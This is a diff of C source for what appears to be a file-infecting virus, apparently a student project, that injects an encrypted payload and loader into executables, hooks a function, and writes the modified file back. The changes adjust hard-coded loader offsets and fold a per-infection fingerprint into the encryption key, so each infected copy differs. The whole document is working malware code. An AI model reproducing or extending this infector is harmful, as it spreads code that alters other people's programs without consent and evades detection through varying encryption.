@@ -49,7 +49,7 @@ static void	patch_payload(t_info *info)
 	int32_t	val;
 
 	start = (int32_t)(info->addr_bis + PAYLOAD_SIZE + BIS_SIZE);
-	end = info->addr_bis + /*A*/0x155/*A`*/; // ajouter l'addresse du milieu du bis
+	end = info->addr_bis + /*A*/0x180/*A`*/; // ajouter l'addresse du milieu du bis
 	val = end - start;
 
 	// replace jmp addr
@@ -82,25 +82,25 @@ void	patch_bis(t_info *info, int32_t nb)
 	start = info->addr_bis + BIS_SIZE;
 	start += 5;
 	if (nb == 1)
-		start -= 0x133;//REPLACE1
+		start -= 0x15e;//REPLACE1
 	if (nb == 2)
-		start -= 0xa4;//REPLACE2
+		start -= 0xb4;//REPLACE2
 	if (nb == 3)
-		start -= 0x9f;//REPLACE3
+		start -= 0xaf;//REPLACE3
 	if (nb == 4)
-		start -= 0x123;//REPLACE4
+		start -= 0x14e;//REPLACE4
 	if (nb == 5)
 		start -= 0x21;//REPLACE5
 	end = (int32_t)((size_t)(info->addr_hooked_func) - (size_t)(info->text_begin) + info->text_addr);
 	val = end - start;
 	if (nb == 1)
-		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x133/*REPLACE1*/ + 1, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x15e/*REPLACE1*/ + 1, &val, 4);
 	if (nb == 2)
-		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0xa4/*REPLACE2*/ + 1, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0xb4/*REPLACE2*/ + 1, &val, 4);
 	if (nb == 3)
-		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x9f/*REPLACE3*/ + 1, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0xaf/*REPLACE3*/ + 1, &val, 4);
 	if (nb == 4)
-		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x123/*REPLACE4*/ + 1, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x14e/*REPLACE4*/ + 1, &val, 4);
 	if (nb == 5)
 		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x21/*REPLACE5*/ + 1, &val, 4);
 }
@@ -185,7 +185,21 @@ static int		inject_sign(t_info *info, t_fingerprint *fingerprint)
 	return (0);
 }
 
-uint32_t    encrypt(t_info *info, void *ptr, size_t size)
+// void	ft_putnbr(uint32_t n)
+// {
+// 	if (n < 10)
+// 	{
+// 		n += '0';
+// 		ft_syswrite(1, &n, 1);
+// 	}
+// 	else
+// 	{
+// 		ft_putnbr(n / 10);
+// 		ft_putnbr(n % 10);
+// 	}
+// }
+
+uint32_t    encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint)
 {
     uint32_t    *file;
     uint32_t    key;
@@ -193,11 +207,14 @@ uint32_t    encrypt(t_info *info, void *ptr, size_t size)
 
     file = (uint32_t *)ptr;
 
-	uint32_t start = info->addr_bis + /*B*/0xf1/*B`*/;
+	uint32_t start = info->addr_bis + /*B*/0x10c/*B`*/;
 	uint32_t end = (int32_t)(info->addr_bis + BIS_SIZE + MAIN_OFFSET);
 	key = end - start; // key is now offset to jump payload from loader
 // 	dprintf(1, "%#x\n", key);
 //     key = KEY;
+	key += fingerprint;
+// 	ft_putnbr(fingerprint);
+// 	(void)fingerprint;
     int nb = 0;
 	size = (size / 4 ) * 4;
     while (nb < 8)
@@ -227,7 +244,7 @@ uint32_t	hash_loader(t_info *info)
 	size_t i = 0;
 	while (i < size)
 	{
-		if (i < 0x9D || i > 0xa1) //a modifier debut et fin pos adresse apres pos_rdi dans loader
+		if (i < 0x91 || i > 0x95) //a modifier debut et fin pos adresse apres pos_rdi dans loader
 				hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
@@ -249,7 +266,7 @@ uint32_t	hash_loader(t_info *info)
 	return (hash);
 }
 
-void			patch_key(t_info *info, uint32_t key)
+void			patch_key(t_info *info, uint32_t key, uint32_t fingerprint)
 {
 	uint32_t val;
 	uint32_t hash;
@@ -259,6 +276,12 @@ void			patch_key(t_info *info, uint32_t key)
 	// Key in loader
 	val = key - hash;
 	ft_memcpy(info->file + info->offset_bis + /*C*/0x91/*C`*/, &val, 4); // 0x78 is addr of key in bis
+
+// 	(void)fingerprint;
+	val = fingerprint;
+	ft_memcpy(info->file + info->offset_bis + /*D*/0xFB/*D`*/, &val, 4); //0xfb is pos of fingerprint sub in bis
+
+
 }
 
 
@@ -303,7 +326,7 @@ static void		infect_file(char *path, t_fingerprint *fingerprint)
 		goto end_fct;
 	patch_addresses(&info);
 	inject_sign(&info, fingerprint);
-	patch_key(&info, encrypt(&info, info.file + info.offset_bis + BIS_SIZE, PAYLOAD_SIZE));
+	patch_key(&info, encrypt(&info, info.file + info.offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint), fingerprint->fingerprint);
 	ft_syswrite(info.fd, info.file, info.file_size);
 	end_fct:
 	ft_sysmunmap(info.file, info.file_size);
